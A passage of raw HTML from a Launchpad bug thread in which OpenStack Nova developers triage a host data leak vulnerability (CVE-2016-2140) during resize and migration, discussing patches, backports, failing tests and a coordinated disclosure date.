2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     instance, size, fallback_from_host)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 6409, in _try_fetch_image_cache
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     size=size)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 240, in cache
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     *args, **kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 472, in create_image
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     prepare_template(target=base, max_size=size, *args, **kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File "/usr/lib/python2.7/site-packages/oslo_concurrency/lockutils.py", line 254, in inner
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     return f(*args, **kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 230, in fetch_func_sync
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     fetch_func(target=target, *args, **kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/utils.py", line 406, in fetch_image
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     max_size=max_size)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]   File "/usr/lib/python2.7/site-packages/nova/virt/images.py", line 126, in fetch_to_raw
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9]     {'fmt': fmt, 'backing_file': backing_file}))
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] ImageUnacceptable: Image 2cb1fb9e-f628-4d3f-8de8-09070c5de7fa is unacceptable: fmt=qcow2 backed by: /dev/sda3


So it looks like we still only have the live and cold migration cases to fix at the moment.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/33" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-26T14:06:16.644909+00:00" title="2016-02-26 14:06:16 UTC">on 2016-02-26</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/33"> #33</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Just to clarify Lee&#x27;s last, I still consider the unshelve case a bug. However, it&#x27;s not an exploitable bug because of the checking in fetch_to_raw. We should fix it, but given that it&#x27;s substantially more complex than all the other cases I don&#x27;t think we need to deal with it via this process.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Just to clarify Lee's last, I still consider the unshelve case a bug. However, it's not an exploitable bug because of the checking in fetch_to_raw. We should fix it, but given that it's substantially more complex than all the other cases I don't think we need to deal with it via this process.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/34" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-26T14:42:03.594166+00:00" title="2016-02-26 14:42:03 UTC">on 2016-02-26</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/34"> #34</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Lee, you are correct, I tested the shelve issue against openstack-<wbr />nova-api-<wbr />2015.1.<wbr />1-1.el7.<wbr />noarch.<br />
But if it&#x27;s not exploitable, then it seems like the impact description in comment #11 still holds.</p>
<p>Does the patch fix cold and live migrate issue ?<br />
If so, then it may need better commit message and also clean backports for stable/liberty and stable/kilo.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Lee, you are correct, I tested the shelve issue against openstack-nova-api-2015.1.1-1.el7.noarch.
But if it's not exploitable, then it seems like the impact description in comment #11 still holds.

Does the patch fix cold and live migrate issue ?
If so, then it may need better commit message and also clean backports for stable/liberty and stable/kilo.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/35" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-26T16:08:46.800726+00:00" title="2016-02-26 16:08:46 UTC">on 2016-02-26</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/35"> #35</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Correct, the impact statement is still correct. The patch fixes both cold (including resize) and live migrations. I&#x27;ll add a commit message, backport to liberty and kilo now.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Correct, the impact statement is still correct. The patch fixes both cold (including resize) and live migrations. I'll add a commit message, backport to liberty and kilo now.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/39" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-01T14:09:01.449032+00:00" title="2016-03-01 14:09:01 UTC">on 2016-03-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/39"> #39</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Tristian, apologies for the delay, I have finally attached the master, stable/liberty and stable/kilo patches I&#x27;ve been working on after completing some additional devstack testing for the master patch.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Tristian, apologies for the delay, I have finally attached the master, stable/liberty and stable/kilo patches I've been working on after completing some additional devstack testing for the master patch. </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/40" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-01T14:36:17.761590+00:00" title="2016-03-01 14:36:17 UTC">on 2016-03-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/40"> #40</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Still +1 here on the above patches. I feel like we should propose a release date.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Still +1 here on the above patches. I feel like we should propose a release date.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/41" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-01T15:12:15.167584+00:00" title="2016-03-01 15:12:15 UTC">on 2016-03-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/41"> #41</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks Lee, I&#x27;m currently waiting for tox results on all three patchs. CVE has been requested with impact description from comment #11.</p>
<p>If we could send the pre-OSSA out by Friday, I&#x27;d like to propose this disclosure date:<br />
2016-03-09, 1500 UTC</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks Lee, I'm currently waiting for tox results on all three patchs. CVE has been requested with impact description from comment #11.

If we could send the pre-OSSA out by Friday, I'd like to propose this disclosure date:
2016-03-09, 1500 UTC</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/42" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-01T15:27:14.947101+00:00" title="2016-03-01 15:27:14 UTC">on 2016-03-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/42"> #42</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Not sure if it&#x27;s related, but stable/kilo unit tests are failing with:</p>
<p>=======<wbr />=======<wbr />=======<wbr />=======<wbr />==<br />
Failed 1 tests - output below:<br />
=======<wbr />=======<wbr />=======<wbr />=======<wbr />==</p>
<p>nova.tests.<wbr />unit.virt.<wbr />libvirt.<wbr />test_driver.<wbr />LibvirtDriverTe<wbr />stCase.<wbr />test_migrate_<wbr />disk_and_<wbr />power_off_<wbr />resize_<wbr />copy_disk_<wbr />info<br />
-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />----</p>
<p>Captured pythonlogging:<br />
~~~~~~~<wbr />~~~~~~~<wbr />~~~~~~~<wbr />~~<br />
&nbsp;&nbsp;&nbsp;&nbsp;2016-03-01 15:16:29,413 WARNING [nova.virt.<wbr />libvirt.<wbr />firewall] Libvirt module could not be loaded. NWFilterFirewall will not work correctly.</p>
<p>Captured traceback:<br />
~~~~~~~~~~~~~~~~~~~<br />
&nbsp;&nbsp;&nbsp;&nbsp;Traceback (most recent call last):<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File &quot;/home/<wbr />centos/<wbr />cve/nova_<wbr />kilo/.tox/<wbr />py27/lib/<wbr />python2.<wbr />7/site-<wbr />packages/<wbr />mock.py&quot;<wbr />, line 1201, in patched<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return func(*args, **keywargs)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File &quot;nova/tests/<wbr />unit/virt/<wbr />libvirt/<wbr />test_driver.<wbr />py&quot;, line 11683, in test_migrate_<wbr />disk_and_<wbr />power_off_<wbr />resize_<wbr />copy_disk_<wbr />info<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;on_completion=<wbr />mock.ANY, compression=<wbr />mock.ANY)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File &quot;/home/<wbr />centos/<wbr />cve/nova_<wbr />kilo/.tox/<wbr />py27/lib/<wbr />python2.<wbr />7/site-<wbr />packages/<wbr />mock.py&quot;<wbr />, line 891, in assert_any_call<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#x27;%s call not found&#x27; % expected_string<br />
&nbsp;&nbsp;&nbsp;&nbsp;AssertionError: copy_image(<wbr />u&#x27;/test_<wbr />resize/<wbr />disk.info&#x27;<wbr />, u&#x27;/test/disk.info&#x27;, on_execute=&lt;ANY&gt;, host=&lt;mock.<wbr />_Sentinel object at 0x26b27d0&gt;, on_completion=<wbr />&lt;ANY&gt;, compres<br />
sion=&lt;ANY&gt;) call not found</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Not sure if it's related, but stable/kilo unit tests are failing with:

==============================
Failed 1 tests - output below:
==============================

nova.tests.unit.virt.libvirt.test_driver.LibvirtDriverTestCase.test_migrate_disk_and_power_off_resize_copy_disk_info
--------------------------------------------------------------------------------------------------------------------

Captured pythonlogging:
~~~~~~~~~~~~~~~~~~~~~~~
    2016-03-01 15:16:29,413 WARNING [nova.virt.libvirt.firewall] Libvirt module could not be loaded. NWFilterFirewall will not work correctly.
    
Captured traceback:
~~~~~~~~~~~~~~~~~~~
    Traceback (most recent call last):
      File "/home/centos/cve/nova_kilo/.tox/py27/lib/python2.7/site-packages/mock.py", line 1201, in patched
        return func(*args, **keywargs)
      File "nova/tests/unit/virt/libvirt/test_driver.py", line 11683, in test_migrate_disk_and_power_off_resize_copy_disk_info
        on_completion=mock.ANY, compression=mock.ANY)
      File "/home/centos/cve/nova_kilo/.tox/py27/lib/python2.7/site-packages/mock.py", line 891, in assert_any_call
        '%s call not found' % expected_string
    AssertionError: copy_image(u'/test_resize/disk.info', u'/test/disk.info', on_execute=&lt;ANY&gt;, host=&lt;mock._Sentinel object at 0x26b27d0&gt;, on_completion=&lt;ANY&gt;, compres
sion=&lt;ANY&gt;) call not found


</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/43" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-01T15:39:43.831178+00:00" title="2016-03-01 15:39:43 UTC">on 2016-03-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/43"> #43</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Apologies, that&#x27;s another conflict, the compress argument was added to libvirt_<wbr />utils.copy_<wbr />image in Liberty, removing this and updating the commit message now.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Apologies, that's another conflict, the compress argument was added to libvirt_utils.copy_image in Liberty, removing this and updating the commit message now. </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/44" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-01T15:50:41.115116+00:00" title="2016-03-01 15:50:41 UTC">on 2016-03-01</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/44"> #44</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve updated and attached the Kilo patch, apologies again.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've updated and attached the Kilo patch, apologies again.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2016-03-01 16:05:32 UTC" datetime="2016-03-01T16:05:32.394686+00:00">on 2016-03-01</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
          Host data leak during resize/migrate for raw-backed instances<br />+ (CVE-2016-2140)
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; In Progress
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/45" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-01T16:25:46.946086+00:00" title="2016-03-01 16:25:46 UTC">on 2016-03-01</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/45">
                <strong>Re: Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/45"> #45</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Running tox -epy27 with patch in comment #44:<br />
&nbsp;&nbsp;py27: commands succeeded<br />
&nbsp;&nbsp;pep8: commands succeeded<br />
&nbsp;&nbsp;congratulations :)</p>
<p>Assuming these patchs get pre-approved soon, is 2016-03-09, 1500 UTC too early for disclosure date ?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Running tox -epy27 with patch in comment #44:
  py27: commands succeeded
  pep8: commands succeeded
  congratulations :)

Assuming these patchs get pre-approved soon, is 2016-03-09, 1500 UTC too early for disclosure date ?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/46" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-02T09:48:33.129256+00:00" title="2016-03-02 09:48:33 UTC">on 2016-03-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/46"> #46</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>2016-03-09 works for me, but I feel we could even go sooner than that assuming we get the pre-approval. What&#x27;s the schedule like?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
